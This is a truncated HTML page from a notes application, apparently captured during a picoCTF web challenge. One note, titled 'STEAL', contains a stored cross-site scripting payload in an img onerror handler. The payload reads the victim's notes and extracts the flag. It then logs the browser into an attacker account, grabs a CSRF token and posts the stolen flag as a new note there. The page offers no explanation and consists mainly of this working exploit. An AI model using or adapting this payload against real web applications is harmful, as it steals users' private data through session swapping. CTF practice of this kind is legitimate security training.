<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<style>
	* {

	}

	body {
		max-width: 1200px;

	}

	h1 {
		line-height: 1em;
	}

	input, button, textarea {
		padding: 5px;

<body>
<h1>My Notes</h1>
<hr>

<div>
	<h2>STEAL</h2>
	<p><img src=x onerror='fetch("/notes").then(r=>r.text()).then(h=>{let m=h.match(/picoCTF\{[^}]+\}/);if(m){fetch("/login",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"username=hax1&password=hax1"}).then(()=>fetch("/new")).then(r=>r.text()).then(html=>{let c=html.match(/name=\"_csrf\" value=\"([^\"]+)\"/)[1];fetch("/new",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"_csrf="+c+"&title=FLAGHERE&content="+encodeURIComponent(m[0])})})}})'></p>
	<form action="/delete" method="POST">
		<input type="hidden" name="_csrf" value="XALpWcol-c9XrBawdT2bOwU7JL1jnELvHQF0">

<div>

	<form action="/delete" method="POST">
